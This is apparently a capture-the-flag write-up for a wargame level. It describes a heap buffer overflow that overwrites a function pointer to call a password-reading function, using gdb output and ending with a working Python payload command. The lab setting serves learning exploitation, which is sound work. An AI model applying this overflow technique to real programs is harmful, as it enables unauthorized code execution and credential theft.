level 6

like always we have an executabe level6

containing 3 functions the one we need to focus on is n() it has a call to system

the main function allocate 40 to a first variable in the heap using malloc
then allocate to another variable 4 in the heap using malloc
then put the address of m function into the second function
then copy the argv[1] into the first variable
and call the function pointed with the second variable.

the m function pirnts Nope using puts and return

the n function call system with "/bin/cat /home/user/level7/.pass" as arg

so basically we need to write in the first cariable till it overflow to the second address in heap and put the address of n function in place of the m function to do so we need to know the diff between the first address and the second one 

(gdb) r adasdasdsad
Starting program: /home/user/level6/level6 adasdasdsad

Breakpoint 1, 0x08048491 in main () # first malloc return
(gdb) x $eax
0x804a008:	0x00000000
(gdb) c
Continuing.

Breakpoint 2, 0x080484a1 in main () # second malloc return
(gdb) x $eax
0x804a050:	0x00000000

the diff between the two address is 72

the address of n function is
(gdb) x n
0x8048454 <n>:	0x83e58955
(gdb)

0x8048454=litleendian>'\x54\x84\x04\x08'
so the payload would be somthing like this :

./level6 $(python -c "print('A' * 72 + '\x54\x84\x04\x08')")
